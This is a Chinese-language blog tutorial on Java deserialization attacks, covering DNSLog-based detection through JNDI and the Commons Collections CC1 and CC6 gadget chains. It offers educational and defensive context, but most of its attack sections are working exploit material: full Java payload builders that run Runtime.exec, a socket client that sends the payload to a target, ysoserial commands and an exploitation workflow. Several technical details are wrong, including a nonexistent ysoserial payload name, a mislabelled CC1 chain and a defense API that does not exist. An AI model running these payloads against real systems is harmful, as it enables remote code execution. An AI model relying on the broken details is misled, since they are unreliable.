---
title: "Java反序列化入门：从DNSLog验证到CC链利用"
date: 2026-06-15 10:00:00 +0800
author: Security Researcher
categories: [Web安全, Java安全]
tags: [Java反序列化, CC链, DNSLog, 漏洞利用, Commons Collections, ysoserial]
description: 新手友好的Java反序列化漏洞学习指南。从序列化基础原理讲起，详解DNSLog链用于无回显漏洞验证，再到CC链（Commons Collections）实现命令执行。包含原理图解、Payload逐字段解析和防御建议。
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。未经授权对他人系统进行渗透测试属于违法行为。

---

## 前言

Java反序列化漏洞是近年来最热门的Web安全议题之一。从2015年被公开披露至今，大量主流框架和中间件（WebLogic、JBoss、Spring等）都受此影响。

本文面向**零基础新手**，从序列化原理讲起，逐步讲解：
1. **DNSLog链** — 如何判断目标是否存在反序列化漏洞（无回显场景）
2. **CC链** — 如何利用Commons Collections库实现命令执行

---

## 第一章：Java序列化基础

### 什么是序列化和反序列化？

| 概念 | 定义 | 类比 |
|------|------|------|
| **序列化** | 将对象转换为字节流，便于存储或传输 | 把食物做成罐头 |
| **反序列化** | 将字节流还原为对象 | 把罐头还原成食物 |

### 为什么需要序列化？

- **网络传输**：RMI、JMS等远程调用需要传输对象
- **持久化存储**：将对象保存到文件或数据库
- **缓存**：将对象序列化后存入Redis等缓存

### 代码示例

```java
import java.io.*;

// 1. 对象必须实现Serializable接口
class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private int age;

    public User(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "User{name='" + name + "', age=" + age + "}";
    }
}

public class SerializeDemo {
    public static void main(String[] args) throws Exception {
        // ===== 序列化 =====
        User user = new User("admin", 25);
        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("user.dat"));
        oos.writeObject(user);
        oos.close();

        // ===== 反序列化 =====
        ObjectInputStream ois = new ObjectInputStream(
            new FileInputStream("user.dat"));
        User restored = (User) ois.readObject();
        ois.close();

        System.out.println(restored);  // User{name='admin', age=25}
    }
}
```

### 序列化后的数据长什么样？

序列化后的字节流有固定格式：

```
- 魔数：AC ED（固定标识这是Java序列化数据）
- 版本号：00 05
- 类描述：包含类名、serialVersionUID等
- 对象数据：各个字段的值
```

### 关键类

| 类名 | 作用 |
|------|------|
| `ObjectOutputStream` | 将对象序列化为字节流 |
| `ObjectInputStream` | 将字节流反序列化为对象 |
| `Serializable` | 标记接口，表示类可以被序列化 |

---

## 第二章：反序列化漏洞原理

### 漏洞产生的根本原因

反序列化漏洞的核心问题：**Java在反序列化时会自动调用对象的 `readObject()` 方法，而攻击者可以控制输入数据。**

正常流程：
```
应用程序收到数据 → 调用readObject() → 对象被还原 → 程序继续执行
```

攻击流程：
```
攻击者构造恶意数据 → 应用程序调用readObject() → 触发恶意代码 → 执行命令
```

### 魔术方法（Magic Methods）

Java反序列化时会自动调用以下方法：

| 方法名 | 触发时机 |
|--------|----------|
| `readObject()` | 反序列化时调用 |
| `readResolve()` | 反序列化后调用，可替换返回对象 |
| `readExternal()` | 实现Externalizable接口时调用 |

**攻击者可以重写这些方法，在其中植入恶意代码。**

### 攻击链（Gadget Chain）

单个类的 `readObject()` 往往不够用，攻击者需要**串联多个类**，形成一条调用链：

```
readObject() → 方法A → 方法B → 方法C → 执行命令
```

每个环节都是JDK或第三方库中**已存在的类**，攻击者只需要精心构造序列化数据，就能触发整条链。

---

## 第三章：环境搭建

### 漏洞靶场

推荐使用以下靶场练习：
- [ysoserial](https://github.com/frohoff/ysoserial) — Java反序列化Payload生成工具
- 各种CTF靶场中的Java反序列化题目

### 依赖配置

如果需要本地搭建实验环境，`pom.xml`中需要添加：

```xml
<dependencies>
    <!-- Commons Collections 3.1（存在漏洞的版本） -->
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
</dependencies>
```

---

## 第四章：DNSLog链详解

### 什么是DNSLog？

DNSLog是一个**DNS日志平台**，可以记录所有向其发起的DNS查询请求。

**用途**：验证漏洞是否存在（无回显场景）

当目标服务器没有命令执行回显时，我们无法直接看到命令结果。但可以让服务器发起DNS查询，通过DNSLog平台查看是否收到请求。

### DNSLog平台

- http://dnslog.cn
- http://ceye.io
- http://oob.fun

### DNSLog链原理

DNSLog链的核心思路：

```
反序列化 → 触发JNDI查询 → 向DNSLog服务器发起请求 → 攻击者在DNSLog看到记录 → 确认漏洞存在
```

### JNDI注入基础

JNDI（Java Naming and Directory Interface）是Java的命名目录接口，支持多种协议：

| 协议 | 说明 |
|------|------|
| `rmi://` | Java远程方法调用 |
| `ldap://` | 轻量级目录访问协议 |
| `dns://` | DNS查询 |

### DNSLog链的触发路径

以JDK自带的 `com.sun.rowset.JdbcRowSetImpl` 为例：

```java
// setAutoCommit() 会触发JNDI查询
public void setAutoCommit(boolean auto) throws SQLException {
    if (this.getConnection() != null && ...) {
        // ...
    }
    // 关键：调用connect()方法
    this.connect();
}

private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    }
    
    // 如果dataSourceName不为空，会进行JNDI查找
    Context ctx = new InitialContext();
    this.conn = (Connection) ctx.lookup(this.dataSourceName);
    return this.conn;
}
```

### Payload构造

使用ysoserial生成DNSLog链的Payload：

```bash
java -jar ysoserial.jar JdbcRowSetImpl "dnslog.cn的子域名" > payload.bin
```

### 发送Payload

假设目标存在反序列化入口点（如接收字节流的接口）：

```java
import java.io.*;
import java.net.Socket;

public class ExploitClient {
    public static void main(String[] args) throws Exception {
        // 读取生成的Payload
        byte[] payload = Files.readAllBytes(Paths.get("payload.bin"));
        
        // 连接目标服务器
        Socket socket = new Socket("target-ip", 8080);
        OutputStream os = socket.getOutputStream();
        
        // 发送Payload
        os.write(payload);
        os.flush();
        os.close();
    }
}
```

### 验证结果

1. 发送Payload后，查看DNSLog平台
2. 如果看到目标服务器的DNS查询记录，说明漏洞存在
3. 服务器名称中会包含我们的子域名

```
xxx.dnslog.cn  ← 目标服务器发起的查询
```

---

## 第五章：CC链详解（Commons Collections）

### Commons Collections是什么？

Apache Commons Collections是Apache基金会的一个Java工具库，提供了丰富的集合操作工具类。它被广泛应用于各种Java项目中。

**为什么CC链如此出名？**
1. 应用广泛，很多项目都依赖此库
2. 提供了强大的函数式编程支持（Transformer接口）
3. 多个版本都存在可利用的链

### CC链的核心组件

#### 1. Transformer接口

Transformer是一个函数式接口，只有一个方法：

```java
public interface Transformer<I, O> {
    O transform(I input);
}
```

**作用**：将输入转换为输出。我们可以用它来串联各种操作。

#### 2. 常用Transformer实现

| 类名 | 作用 |
|------|------|
| `ConstantTransformer` | 忽略输入，返回常量 |
| `InvokerTransformer` | 调用对象的方法 |
| `ChainedTransformer` | 将多个Transformer链式执行 |
| `MapTransformer` | 从Map中获取值 |

#### 3. 关键类详解

**ConstantTransformer**：
```java
public class ConstantTransformer implements Transformer {
    private final Object constant;
    
    public Object transform(Object input) {
        return this.constant;  // 无论输入什么，都返回常量
    }
}
```

**InvokerTransformer**：
```java
public class InvokerTransformer implements Transformer {
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    
    public Object transform(Object input) {
        // 调用input的指定方法
        Method method = input.getClass().getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
    }
}
```

**ChainedTransformer**：
```java
public class ChainedTransformer implements Transformer {
    private final Transformer[] iTransformers;
    
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
}
```

---

### CC1链详解

CC1链是最早的Commons Collections利用链，适用于3.1版本。

#### 攻击流程图

```
┌─────────────────────────────────────────────────────────────┐
│                        CC1链调用流程                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  BadAttributeValueExpException.readObject()                 │
│       ↓                                                     │
│  TiedMapEntry.toString()                                    │
│       ↓                                                     │
│  TiedMapEntry.getValue()                                    │
│       ↓                                                     │
│  LazyMap.get()                                              │
│       ↓                                                     │
│  ChainedTransformer.transform()                             │
│       ↓                                                     │
│  ConstantTransformer → Runtime.class                        │
│       ↓                                                     │
│  InvokerTransformer → getRuntime()                          │
│       ↓                                                     │
│  InvokerTransformer → exec("命令")                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 逐步分析

**第一步：BadAttributeValueExpException.readObject()**

```java
public class BadAttributeValueExpException implements Serializable {
    private Object val;
    
    public void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val = valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            // 关键：调用toString()
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
}
```

**分析**：如果 `val` 是一个 `TiedMapEntry` 对象，就会调用其 `toString()` 方法。

**第二步：TiedMapEntry.toString()**

```java
public class TiedMapEntry implements MapEntry, Serializable {
    private final Map map;
    private final Object key;
    
    public String toString() {
        // 关键：调用getValue()
        return getValue().toString();
    }
    
    public Object getValue() {
        // 关键：调用map.get(key)
        return map.get(key);
    }
}
```

**分析**：`toString()` 会调用 `getValue()`，而 `getValue()` 会调用 `map.get(key)`。

**第三步：LazyMap.get()**

```java
public class LazyMap extends AbstractInputCheckedMapDecorator implements Serializable {
    protected final Transformer factory;
    
    public Object get(Object key) {
        // 如果key不存在，调用factory.transform()
        if (!super.map.containsKey(key)) {
            Object value = factory.transform(key);
            super.map.put(key, value);
            return value;
        }
        return super.map.get(key);
    }
}
```

**分析**：当 `key` 不存在于 `map` 中时，会调用 `factory.transform(key)`。

**第四步：ChainedTransformer.transform()**

我们构造的 `ChainedTransformer` 会依次执行：

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
```

执行过程：
1. `ConstantTransformer` → 返回 `Runtime.class`
2. `InvokerTransformer` → 调用 `Runtime.class.getMethod("getRuntime")`
3. `InvokerTransformer` → 调用 `Runtime.getRuntime()`
4. `InvokerTransformer` → 调用 `runtime.exec("calc")`

#### Payload生成

使用ysoserial生成CC1链Payload：

```bash
java -jar ysoserial.jar CommonsCollections1 "calc" > payload.bin
```

#### 手动构造Payload

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CC1Payload {
    public static void main(String[] args) throws Exception {
        // 构造Transformer链
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[]{String.class, Class[].class}, 
                new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", 
                new Class[]{Object.class, Object[].class}, 
                new Object[]{null, null}),
            new InvokerTransformer("exec", 
                new Class[]{String.class}, 
                new Object[]{"calc"})
        };
        
        // 创建ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(transformers);
        
        // 创建LazyMap
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        
        // 创建TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
        
        // 创建BadAttributeValueExpException
        BadAttributeValueExpException exception = new BadAttributeValueExpException();
        // 反射设置val字段
        java.lang.reflect.Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, entry);
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(exception);
        oos.close();
        
        // 输出Payload
        byte[] payload = baos.toByteArray();
        System.out.println("Payload length: " + payload.length);
        
        // 保存到文件
        FileOutputStream fos = new FileOutputStream("cc1_payload.bin");
        fos.write(payload);
        fos.close();
    }
}
```

---

### CC6链详解（适用范围更广）

CC6链适用于Commons Collections 3.1-4.1的大部分版本，是实战中最常用的链。

#### CC6链流程图

```
┌─────────────────────────────────────────────────────────────┐
│                        CC6链调用流程                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  HashMap.readObject()                                       │
│       ↓                                                     │
│  HashMap.put()                                              │
│       ↓                                                     │
│  HashMap.hash()                                             │
│       ↓                                                     │
│  TiedMapEntry.hashCode()                                    │
│       ↓                                                     │
│  TiedMapEntry.getValue()                                    │
│       ↓                                                     │
│  LazyMap.get()                                              │
│       ↓                                                     │
│  ChainedTransformer.transform()                             │
│       ↓                                                     │
│  执行命令                                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 关键区别

CC6链与CC1链的区别：
- **入口点不同**：CC1用 `BadAttributeValueExpException`，CC6用 `HashMap`
- **触发方式不同**：CC1通过 `toString()`，CC6通过 `hashCode()`
- **适用版本更广**：CC6不受某些版本限制

#### Payload生成

```bash
java -jar ysoserial.jar CommonsCollections6 "calc" > payload.bin
```

#### 手动构造

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CC6Payload {
    public static void main(String[] args) throws Exception {
        // 构造Transformer链
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[]{String.class, Class[].class}, 
                new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", 
                new Class[]{Object.class, Object[].class}, 
                new Object[]{null, null}),
            new InvokerTransformer("exec", 
                new Class[]{String.class}, 
                new Object[]{"calc"})
        };
        
        ChainedTransformer chain = new ChainedTransformer(transformers);
        
        // 创建LazyMap
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        
        // 创建TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
        
        // 创建HashMap
        Map map = new HashMap();
        // 注意：需要先添加一个entry，否则put时会触发hash
        map.put(entry, "value");
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();
        
        byte[] payload = baos.toByteArray();
        FileOutputStream fos = new FileOutputStream("cc6_payload.bin");
        fos.write(payload);
        fos.close();
    }
}
```

---

## 第六章：利用工具ysoserial

### 简介

ysoserial是Java反序列化漏洞利用的瑞士军刀，集成了大量现成的利用链。

### 下载

```bash
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -DskipTests
```

### 常用命令

```bash
# 列出所有可用的Payload
java -jar ysoserial.jar

# 生成DNSLog验证Payload
java -jar ysoserial.jar JdbcRowSetImpl "your.dnslog.cn" > dns.bin

# 生成CC1链Payload
java -jar ysoserial.jar CommonsCollections1 "calc" > cc1.bin

# 生成CC6链Payload
java -jar ysoserial.jar CommonsCollections6 "calc" > cc6.bin
```

### 常用Payload类型

| Payload名 | 适用库 | 说明 |
|-----------|--------|------|
| JdbcRowSetImpl | JDK自带 | JNDI注入，用于DNSLog验证 |
| CommonsCollections1 | CC 3.1 | 经典CC链 |
| CommonsCollections2 | CC 4.0 | 使用PriorityQueue |
| CommonsCollections3 | CC 3.1 | 使用InstantiateTransformer |
| CommonsCollections4 | CC 4.0 | 使用TreeBag |
| CommonsCollections5 | CC 3.1 | 使用BadAttributeValueExpException |
| CommonsCollections6 | CC 3.1-4.1 | 最常用，适用范围广 |
| CommonsCollections7 | CC 3.1 | 使用Hashtable |

---

## 第七章：实战流程

### 完整利用步骤

```
1. 识别入口点
   ↓
2. 确认反序列化点（是否有ObjectInputStream.readObject()）
   ↓
3. DNSLog验证
   - 生成JdbcRowSetImpl Payload
   - 发送Payload
   - 查看DNSLog是否有记录
   ↓
4. 确认依赖版本
   - 检查目标使用的Commons Collections版本
   - 选择对应的CC链
   ↓
5. 生成Exploit Payload
   - 使用ysoserial生成对应Payload
   ↓
6. 发送Payload执行命令
   - 将Payload发送到反序列化入口点
   - 执行命令
```

### 关键点

1. **入口点识别**：寻找接收序列化数据的地方（如HTTP参数、Cookie、文件上传等）
2. **依赖确认**：确认目标环境中存在哪些可利用的库
3. **版本匹配**：不同版本需要使用不同的Payload

---

## 第八章：防御措施

### 1. 禁用反序列化

最安全的方式是完全禁用反序列化功能，或使用白名单机制：

```java
// 只允许反序列化特定类
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setValidatingClassLoader(new ClassLoader() {
    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        if ("com.safe.MyClass".equals(name)) {
            return super.loadClass(name);
        }
        throw new ClassNotFoundException("Not allowed: " + name);
    }
});
```

### 2. 使用替代方案

- 使用JSON替代Java原生序列化
- 使用Protobuf、MessagePack等更安全的序列化方案

### 3. 依赖管理

- 及时更新第三方库版本
- Commons Collections 3.2.2+ 和 4.1+ 修复了大部分已知漏洞
- 使用OWASP Dependency Check等工具扫描依赖

### 4. 网络隔离

- 限制服务器出网能力（阻止JNDI连接）
- 部署WAF检测恶意序列化数据

### 5. RASP防护

- 使用运行时应用自保护（RASP）技术
- 拦截危险的反序列化操作

---

## 参考资源

- [ysoserial - Java反序列化利用工具](https://github.com/frohoff/ysoserial)
- [Apache Commons Collections](https://commons.apache.org/proper/commons-collections/)
- [Java序列化官方文档](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serial-arch.html)
- [marshalsec - Java反序列化研究](https://github.com/mbechler/marshalsec)
- [PayloadsAllTheThings - Java Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/Java)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

## 总结

| 主题 | 核心要点 |
|------|---------|
| **序列化基础** | `ObjectOutputStream` 序列化，`ObjectInputStream` 反序列化，`readObject()` 是关键入口 |
| **漏洞原理** | 攻击者控制反序列化数据，触发精心构造的调用链执行恶意代码 |
| **DNSLog链** | 用于无回显漏洞验证，通过JNDI查询向DNSLog服务器发起请求 |
| **CC链** | 利用Commons Collections库的Transformer机制，串联多个类实现命令执行 |
| **CC1 vs CC6** | CC1用 `BadAttributeValueExpException` 入口，CC6用 `HashMap` 入口，CC6适用范围更广 |

**核心教训**：Java反序列化漏洞的本质是**信任了不可信的数据**。防御的核心思路是**不要反序列化不可信的数据**，或者在反序列化时**严格限制允许的类**。

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年6月15日*
